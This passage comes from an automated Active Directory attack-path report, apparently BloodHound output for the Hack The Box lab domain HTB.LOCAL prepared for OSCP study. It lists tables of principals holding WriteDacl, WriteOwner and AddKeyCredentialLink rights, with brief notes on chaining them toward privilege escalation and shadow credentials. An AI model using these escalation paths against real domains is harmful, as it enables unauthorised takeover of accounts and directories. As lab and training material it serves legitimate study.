| ENTERPRISE ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ACCOUNT OPERATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ACCOUNT OPERATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |

### [-] Shadow Admins (Control over DA Users)
**OSCP Relevance:** HIGH | **Results:** None

### [OK] WriteDacl Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 100

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SYSADMINS@HTB.LOCAL | ['Base', 'OU'] |
| ADMINISTRATORS@HTB.LOCAL | EXCHANGE ADMINISTRATORS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DEFAULT DOMAIN CONTROLLERS POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DEFAULT DOMAIN CONTROLLERS POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |

### [OK] WriteOwner Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 100

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DNSADMINS@HTB.LOCAL | ['Group', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SYSADMINS@HTB.LOCAL | ['Base', 'OU'] |
| ADMINISTRATORS@HTB.LOCAL | EXCHANGE ADMINISTRATORS@HTB.LOCAL | ['Base', 'OU'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group', 'Base'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DEFAULT DOMAIN CONTROLLERS POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DEFAULT DOMAIN CONTROLLERS POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DEFAULT DOMAIN POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@HTB.LOCAL | DEFAULT DOMAIN POLICY@HTB.LOCAL | ['GPO', 'Base', 'Tag_Tier_Zero'] |

### [OK] AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** HIGH | **Results:** 100

> Find principals with AddKeyCredentialLink permission. Can add msDS-KeyCredentialLink for certificate-based auth without knowing password.

| Attacker | AttackerType | Target | TargetType |
| --- | --- | --- | --- |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SANTI@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SANTI@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | MARK@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | MARK@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | ANDY@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | ANDY@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | LUCINDA@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | LUCINDA@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SEBASTIEN@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SEBASTIEN@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User'] |
